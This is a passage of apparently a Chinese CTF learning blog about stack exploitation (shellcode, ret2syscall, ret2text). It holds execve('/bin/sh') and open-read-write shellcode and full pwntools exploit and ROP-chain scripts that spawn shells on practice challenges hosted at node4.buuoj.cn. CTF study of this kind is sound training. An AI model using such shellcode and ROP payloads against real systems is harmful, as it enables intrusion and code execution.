<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">open(flag_addr,<span class="number">0</span>)</span><br><span class="line">    <span class="comment">//flag_addr是要打开文件的地址</span></span><br><span class="line">read(<span class="number">3</span>,addr,<span class="number">0x50</span>)</span><br><span class="line">    <span class="comment">//一个进程有默认的文件描述符0，1，2。当打开一个新的文件后，新文件的文件描述符就是3，后面再打开的文件的文件描述符以此类推</span></span><br><span class="line">    <span class="comment">//addr可以是任意普通地址</span></span><br><span class="line">    <span class="comment">//0x50是要读的内容的大小</span></span><br><span class="line">write(<span class="number">1</span>,addr,<span class="number">0x50</span>)</span><br><span class="line">    <span class="comment">//文件描述符0，1，2 分别是：标准输入，标准输出，标准错误</span></span><br><span class="line">    <span class="comment">//这里的addr要与read函数中的addr一样</span></span><br></pre></td></tr></table></figure>

<h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a><code>32</code>位</h4><p>​	系统调用存储参数的前<code>3</code>个寄存器：<code>ebx,ecx,edx</code>，函数的系统调用号可在<code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</code>文件中查看，<code>eax</code>存储系统调用号，执行<code>int 0x80</code>指令进行系统调用。</p>
<h5 id="execve"><a href="#execve" class="headerlink" title="execve"></a><code>execve</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx </span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx ;ebx中现在为0</span><br><span class="line">push ebx ;先把一个0压入栈，用来截断字符串</span><br><span class="line">push 0x68732f2f ;把//sh压入栈</span><br><span class="line">push 0x6e69622f ;把/bin压入栈</span><br><span class="line">mov ebx,esp ;把esp指向的地址赋给了ebx，此时ebx中放的是/bin//sh的地址</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<p>这里放一张师父的图片，有助于理解怎么把<code>/bin//sh</code>的地址放入<code>ebx</code>中</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132353394.png" alt="image-20230926230802945"></p>
<h5 id="open-read-write"><a href="#open-read-write" class="headerlink" title="open_read_write"></a><code>open_read_write</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0</span><br><span class="line">push 0x67616c66</span><br><span class="line">push esp</span><br><span class="line">pop ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">push 5</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push eax</span><br><span class="line">pop ebx</span><br><span class="line">push esp </span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 3</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push 1</span><br><span class="line">pop ebx</span><br><span class="line">push esp</span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 4</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>



<h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a><code>64</code>位</h4><p>​	系统调用存储参数的前<code>6</code>个寄存器：<code>rdi,rsi,rdx,r10,r8,r9</code>，函数的系统调用号可在<code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code>文件中查看，<code>rax</code>存储系统调用号，执行<code>syscall</code>指令进行系统调用。</p>
<h5 id="execve-1"><a href="#execve-1" class="headerlink" title="execve"></a><code>execve</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">mov rdi,0x68732f6e69622f #/bin(2f62696e) /sh(2f7368)</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h5 id="open-read-write-1"><a href="#open-read-write-1" class="headerlink" title="open_read_write"></a><code>open_read_write</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x67616c66</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">push 0</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push rsp </span><br><span class="line">pop rsi</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p>​	我们可以利用<code>pwntools</code>中的<code>asm</code>把写好的汇编代码直接转换成机器码</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a><code>others_shellcode</code></h3><p>这道题直接发送<code>shellcode</code>即可，<code>exp</code>如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25752</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx</span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351737.png" alt="image-20231210222035500"></p>
<h3 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a><code>ciscn_2019_n_5</code></h3><p>拿到题目，先检查保护，没开保护，<code>64</code>位程序</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132353809.png" alt="image-20231210134205669"></p>
<p>拖入<code>ida</code>，</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132353640.png" alt="image-20231210134506057"></p>
<p>运行程序，有两次输入的地方</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351745.png" alt="image-20231210134611131"></p>
<p><code>Shift+F12</code>查看字符串，没有找到我们想要的<code>/bin/sh</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132353023.png" alt="image-20231210134823032"></p>
<p>再看右边函数，也没有<code>system</code>函数</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351752.png" alt="image-20231210134953135"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20231210140546109](https://raw.githubusercontent.com/Qwen11/picture/main/202503132352089.png)</span><br><span class="line"></span><br><span class="line">我们可以先把```shellcode```写到```bss```段，然后在栈溢出劫持函数返回地址为```shellcode```的起始地址</span><br><span class="line"></span><br><span class="line">计算偏移量为```0x28```</span><br><span class="line"></span><br><span class="line">![1](https://raw.githubusercontent.com/Qwen11/picture/main/202503132352098.png)</span><br><span class="line"></span><br><span class="line">```exp```如下：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ciscn_2019_n_5&#x27;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,26032)</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall                </span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">bss_addr = 0x601080</span><br><span class="line">payload = b&#x27;a&#x27;*0x28+p64(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351950.png" alt="image-20231210150043471"></p>
<h3 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a><code>ez_pz_hackover_2016</code></h3><p>拿到题目，检查保护，<code>PIE,NX,canary</code>都没开，是<code>32</code>位程序</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132352868.png" alt="image-20231210192130416"></p>
<p>拖入<code>ida</code>中，分析题目</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351088.png" alt="image-20231210200953491"></p>
<p>先进入<code>header</code>函数中看看，就是输出图形的，没什么问题</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351942.png" alt="image-20231210201032463"></p>
<p>再进入<code>chall</code>函数中看看，我们主要分析的应该就是这个函数了</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351082.png" alt="image-20231210202908607"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20231210203253498](https://raw.githubusercontent.com/Qwen11/picture/main/202503132352393.png)</span><br><span class="line"></span><br><span class="line">计算缓冲区到```shellcode```的偏移量为```0x1c```</span><br><span class="line"></span><br><span class="line">![image-20231210200821951](https://raw.githubusercontent.com/Qwen11/picture/main/202503132351108.png)</span><br><span class="line"></span><br><span class="line">`exp`如下：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ez_pz_hackover_2016&#x27;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,26101)</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;crash: &#x27;)</span><br><span class="line">s_addr = int(p.recv(10),16)</span><br><span class="line">shellcode_addr = s_addr-28</span><br><span class="line"></span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">payload = b&#x27;crashme\x00&#x27;+b&#x27;a&#x27;*18+p32(shellcode_addr)+shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351863.png" alt="image-20231210215133554"></p>
]]></content>
      <categories>
        <category>pwn学习总结</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2syscall学习总结</title>
    <url>/2023/12/09/ret2syscall%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h2><h3 id="ret2syscall是什么"><a href="#ret2syscall是什么" class="headerlink" title="ret2syscall是什么"></a><code>ret2syscall</code>是什么</h3><p>​	<code>ret2syscall</code>，即<code>return to syscall</code>，意思是劫持函数返回地址为通过<code>ROP</code>构造的系统调用函数的地址，控制程序执行系统调用，拿到<code>shell</code>。</p>
<span id="more"></span>

<h3 id="ROP原理"><a href="#ROP原理" class="headerlink" title="ROP原理"></a><code>ROP</code>原理</h3><blockquote>
<p>​	<code>ROP</code>的全称为<code>Return-oriented programming</code>，即<strong>返回导向编程</strong>。其主要思想是在栈缓冲区溢出的基础上，通过利用程序中已有的小片段（<code>gadget</code>）来改变某些寄存器或变量的值，从而控制程序的执行流程。</p>
</blockquote>
<h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a><code>gadgets</code></h3><blockquote>
<p>​	<code>gadgets</code>就是以<code>ret</code>结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
</blockquote>
<h3 id="ROP攻击执行需要满足的条件"><a href="#ROP攻击执行需要满足的条件" class="headerlink" title="ROP攻击执行需要满足的条件"></a><code>ROP</code>攻击执行需要满足的条件</h3><p>1.存在栈溢出，可以控制返回地址。</p>
<p>2.可以找到满足条件的<code>gadgets</code>及其地址。</p>
<h3 id="有关系统调用的知识"><a href="#有关系统调用的知识" class="headerlink" title="有关系统调用的知识"></a>有关系统调用的知识</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a><code>32</code>位</h4><p>​	<code>32</code>位系统调用的前<code>6</code>个寄存器分别为<code>ebx,ecx,edx,esi,edi,ebp</code>。通过查看<code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h32</code>文件，我们可以找到函数的系统调用号。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1、把函数的系统调用号放入```eax```寄存器中</span><br><span class="line"></span><br><span class="line">2、把函数参数依次放入寄存器中</span><br><span class="line"></span><br><span class="line">3、执行```int 0x80```指令中断</span><br><span class="line"></span><br><span class="line">#### ```64```位</span><br><span class="line"></span><br><span class="line">​	```64```位系统调用的前```6```个寄存器分别为```rdi,rsi,rdx,rcx,r8,r9```。通过查看```/usr/include/x86_64-linux-gnu/asm/unistd_64.h```文件，我们可以找到函数的系统调用号。</span><br><span class="line"></span><br><span class="line">```64```位应用程序调用系统调用的过程：</span><br><span class="line"></span><br><span class="line">1、把函数的系统调用号放入```rax```寄存器中</span><br><span class="line"></span><br><span class="line">2、把函数参数此次放入寄存器中</span><br><span class="line"></span><br><span class="line">3、执行```syscall```指令</span><br><span class="line"></span><br><span class="line">## 例题</span><br><span class="line"></span><br><span class="line">###  ```inndy_rop```</span><br><span class="line"></span><br><span class="line">拿到题的第一步，先检查一下保护，只开了```NX```保护，并且可知该程序是```32```位的。</span><br><span class="line"></span><br><span class="line">![image-20231209145936854](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354775.png)</span><br><span class="line"></span><br><span class="line">拖入```ida```中，有```gets```函数，可以栈溢出</span><br><span class="line"></span><br><span class="line">![image-20231209162919247](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354081.png)</span><br><span class="line"></span><br><span class="line">计算偏移量为```0x10```</span><br><span class="line"></span><br><span class="line">![image-20231209232158602](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354890.png)</span><br><span class="line"></span><br><span class="line">```syscall```的函数调用规范为```execve(&quot;/bin/sh&quot;,0,0)```，```execve```函数的系统调用号为```11```。</span><br><span class="line"></span><br><span class="line">我们先找到相关的```gadgets```地址，用```ROPgadget --binary rop | grep &quot;pop eax ; ret&quot;```命令寻找```pop eax ; ret```，其他同理</span><br><span class="line"></span><br><span class="line">![image-20231209164349380](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354758.png)</span><br><span class="line"></span><br><span class="line">![image-20231209164436996](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354412.png)</span><br><span class="line"></span><br><span class="line">![image-20231209164618437](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354139.png)</span><br><span class="line"></span><br><span class="line">![image-20231209164548872](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354570.png)</span><br><span class="line"></span><br><span class="line">```int 0x80```指令的地址</span><br><span class="line"></span><br><span class="line">![image-20231209165637692](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354935.png)</span><br><span class="line"></span><br><span class="line">我们还需要找到```pop dword ptr [ecx] ; ret```的地址（也可以是其他普通寄存器，不过这里我们只能找到```ecx```的。```pop dword ptr [ecx]```的意思是**把栈顶的内容弹到指针指的```ecx```中保存的值作为的地址**），利用命令：```ROPgadget --binary rop | grep &quot;pop dword ptr \[ecx\] ; ret&quot;```，注意要用反斜杠进行转义</span><br><span class="line"></span><br><span class="line">![image-20231209203524019](https://raw.githubusercontent.com/Qwen11/picture/main/202503132355878.png)</span><br><span class="line"></span><br><span class="line">```bss```段的地址```0x080eafb8```，我们要把```/bin/sh```写入```bss```段</span><br><span class="line"></span><br><span class="line">![image-20231209170118582](https://raw.githubusercontent.com/Qwen11/picture/main/202503132355914.png)</span><br><span class="line"></span><br><span class="line">这里放一张师父的图片，通过这张图片可以了解把```/bin/sh```写入```bss```段的过程，然后下面的```exp```中我写了相应的解释。</span><br><span class="line"></span><br><span class="line">![img](https://raw.githubusercontent.com/Qwen11/picture/main/202503132355926.png)</span><br><span class="line"></span><br><span class="line">#### ```exp```</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,27738)</span><br><span class="line">#p = process(&#x27;./rop&#x27;)</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">int_0x80_addr=0x0806c943</span><br><span class="line">bss_addr=0x080eafb8</span><br><span class="line">pop_eax_addr = 0x080b8016</span><br><span class="line">pop_ebx_addr = 0x080481c9</span><br><span class="line">pop_ecx_addr = 0x080de769</span><br><span class="line">pop_edx_addr = 0x0806ecda</span><br><span class="line">pop_in_ecx_addr=0x0804b5ba           #指向ecx寄存器中的内容</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*0x10   #栈溢出</span><br><span class="line"></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr)   #先把bss_addr这个地址弹到ecx中</span><br><span class="line">payload+=p32(pop_in_ecx_addr)+b&#x27;/bin&#x27;   #ecx中的内容作为地址，/bin被写入这个地址里，即被写到bss_addr这个地址中</span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+4)   #这个bss_addr+4是上面bss_addr的地址的衔接，因为参数/bin/sh需要两个内存单元存放，因此在这里将上面的地址加4，/sh就存到了下面的内存单元。</span><br><span class="line">payload+=p32(pop_in_ecx_addr)+b&#x27;/sh\x00&#x27;   #前面同理，最后的\x00用来声明字符串的结束</span><br><span class="line"></span><br><span class="line">payload+=p32(pop_eax_addr)+p32(0xb)   #把系统调用号弹到eax中</span><br><span class="line">payload+=p32(pop_ebx_addr)+p32(bss_addr)  #把第一个参数的地址弹到ebx中</span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(0)   #把第二个参数弹到ecx中</span><br><span class="line">payload+=p32(pop_edx_addr)+p32(0)   #把第三个参数弹到edx中</span><br><span class="line">payload+=p32(int_0x80_addr)   #执行int 0x80中断</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132355886.png" alt="image-20231209175629929"></p>
<h3 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a><code>cmcc_simplerop</code></h3><p>拿到题目，先看保护，开了<code>NX</code>保护，是<code>32</code>位程序</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132355752.png" alt="image-20231209195656602"></p>
<p>拖入<code>ida</code>，有<code>read</code>函数，可以栈溢出</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132355365.png" alt="image-20231209195945310"></p>
<p>计算偏移量，这里用<code>cyclic</code>计算偏移量，先复制<code>200</code>个垃圾数据</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132355025.png" alt="image-20231210000043823"></p>
<p>输入</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132355656.png" alt="image-20231210000145966"></p>
<p>然后用<code>cyclic -l 0x61616169</code>计算偏移量为<code>32</code>即<code>0x20</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356455.png" alt="image-20231209235925156"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">这里我们找不到类似上一题中```pop dword ptr [ecx] ; ret```的```gadgets```，因此我们要用其他方法把```/bin/sh```写入```bss```段。我们可以利用程序中现有的```read```函数，来完成这一步。</span><br><span class="line"></span><br><span class="line">```read```函数地址</span><br><span class="line"></span><br><span class="line">![image-20231209212415936](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356365.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```bss```段的地址```0x080eb2a1```</span><br><span class="line"></span><br><span class="line">![image-20231209210856820](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356616.png)</span><br><span class="line"></span><br><span class="line">用```ROPgadget --binary simplerop | grep &quot;int 0x80&quot;```命令找到```int 0x80```指令地址</span><br><span class="line"></span><br><span class="line">![image-20231209202038108](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356455.png)</span><br><span class="line"></span><br><span class="line">寻找```gadgets```</span><br><span class="line"></span><br><span class="line">![image-20231209205944371](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356774.png)</span><br><span class="line"></span><br><span class="line">![image-20231209210024201](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356145.png)</span><br><span class="line"></span><br><span class="line">没有找到```pop ecx ; ret```，但是有```pop edx ; pop ecx ; pop ebx ; ret```，更好了</span><br><span class="line"></span><br><span class="line">![image-20231209210337839](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356930.png)</span><br><span class="line"></span><br><span class="line">#### ```exp```</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">#p = process(&#x27;./simplerop&#x27;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,28283)</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">bss_addr = 0x080eb2a1</span><br><span class="line">int_0x80_addr = 0x080493e1</span><br><span class="line">pop_eax_addr = 0x080bae06</span><br><span class="line">pop_edx_ecx_ebx_addr = 0x0806e850</span><br><span class="line">read_addr = 0x0806cd50</span><br><span class="line">payload = b&#x27;a&#x27;*0x20</span><br><span class="line"></span><br><span class="line">payload += p32(read_addr)+p32(pop_edx_ecx_ebx_addr)#先把read函数原来的3个参数弹出</span><br><span class="line">payload += p32(0)+p32(bss_addr)+p32(8)#写入read函数的参数</span><br><span class="line"></span><br><span class="line">payload += p32(pop_eax_addr)+p32(0xb)#把系统调用号弹到eax中</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_addr)+p32(0)+p32(0)+p32(bss_addr)#把execve函数的3个参数分别弹到ebx，ecx，edx中</span><br><span class="line">payload += p32(int_0x80_addr)#执行int 0x80中断</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&#x27;/bin/sh\x00&#x27;)#这里一定要输入\x00去截断</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356863.png" alt="image-20231209214613569"></p>
<h3 id="picoctf-2018-can-you-gets-me"><a href="#picoctf-2018-can-you-gets-me" class="headerlink" title="picoctf_2018_can_you_gets_me"></a><code>picoctf_2018_can_you_gets_me</code></h3><p>拿到题目，先查看保护，只开了<code>NX</code>保护，是<code>32</code>位程序</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356211.png" alt="image-20231209215403163"></p>
<p>拖入<code>ida</code>中，有<code>gets</code>函数，可以栈溢出</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356785.png" alt="image-20231209220934817"></p>
<p>选一个<code>bss</code>段的地址为<code>0x080eba35</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356751.png" alt="image-20231209221129336"></p>
<p>用<code>gdb</code>调试计算偏移量为<code>0x1c</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356700.png" alt="image-20231209231510597"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">寻找```gadgets```片段</span><br><span class="line"></span><br><span class="line">![image-20231209215819672](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357083.png)</span><br><span class="line"></span><br><span class="line">![image-20231209215908598](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357063.png)</span><br><span class="line"></span><br><span class="line">![image-20231209215943969](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357679.png)</span><br><span class="line"></span><br><span class="line">![image-20231209220018062](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357248.png)</span><br><span class="line"></span><br><span class="line">![image-20231209220149329](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357044.png)</span><br><span class="line"></span><br><span class="line">寻找```int 0x80```中断指令</span><br><span class="line"></span><br><span class="line">![image-20231209220226939](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357595.png)</span><br><span class="line"></span><br><span class="line">#### ```exp```</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./rop3&#x27;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,26246)</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">pop_eax_addr = 0x080b81c6</span><br><span class="line">pop_ebx_addr = 0x080481c9</span><br><span class="line">pop_ecx_addr = 0x080de955</span><br><span class="line">pop_edx_addr = 0x0806f02a</span><br><span class="line">pop_in_ecx_addr = 0x0804b5ea</span><br><span class="line">int_0x80_addr = 0x0806cc25</span><br><span class="line">bss_addr = 0x080eba35</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*(0x1c)</span><br><span class="line">payload += p32(pop_ecx_addr)+p32(bss_addr)+p32(pop_in_ecx_addr)+b&#x27;/bin&#x27;</span><br><span class="line">payload += p32(pop_ecx_addr)+p32(bss_addr+4)+p32(pop_in_ecx_addr)+b&#x27;/sh\x00&#x27;</span><br><span class="line"></span><br><span class="line">payload += p32(pop_eax_addr)+p32(0xb)</span><br><span class="line">payload += p32(pop_ebx_addr)+p32(bss_addr)</span><br><span class="line">payload += p32(pop_ecx_addr)+p32(0)</span><br><span class="line">payload += p32(pop_edx_addr)+p32(0)</span><br><span class="line">payload += p32(int_0x80_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132357205.png" alt="image-20231209222917217"></p>
]]></content>
      <categories>
        <category>pwn学习总结</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2text学习总结</title>
    <url>/2023/12/07/ret2text%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h2><h3 id="什么是ret2text"><a href="#什么是ret2text" class="headerlink" title="什么是ret2text"></a>什么是<code>ret2text</code></h3><p>​	<code>ret2text</code>，即<code>return to text</code>，意思是劫持函数返回地址为程序本身就有的代码(<code>.text</code>)，进而控制程序执行后门函数，拿到<code>shell</code>。</p>
<h3 id="strcpy函数溢出"><a href="#strcpy函数溢出" class="headerlink" title="strcpy函数溢出"></a><code>strcpy</code>函数溢出</h3><ul>
<li><p>当源字符串的长度大于目标缓冲区时，<code>strcpy</code>函数会复制整个源字符串，导致栈溢出。</p>
<span id="more"></span>
</li>
<li><p><code>strcpy</code>函数原型</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="title function_">strcpy</span><span class="params">(<span class="type">char</span>* destination,<span class="type">const</span> <span class="type">char</span>* source)</span>;</span><br><span class="line"><span class="comment">//destination指向要复制的目标缓冲区</span></span><br><span class="line"><span class="comment">//source指向被复制的源字符串</span></span><br></pre></td></tr></table></figure>

<h3 id="ret2text题目类型"><a href="#ret2text题目类型" class="headerlink" title="ret2text题目类型"></a><code>ret2text</code>题目类型</h3><p>​	第一种是直接劫持返回地址为<code>system(&quot;/bin/sh&quot;)</code>的地址。</p>
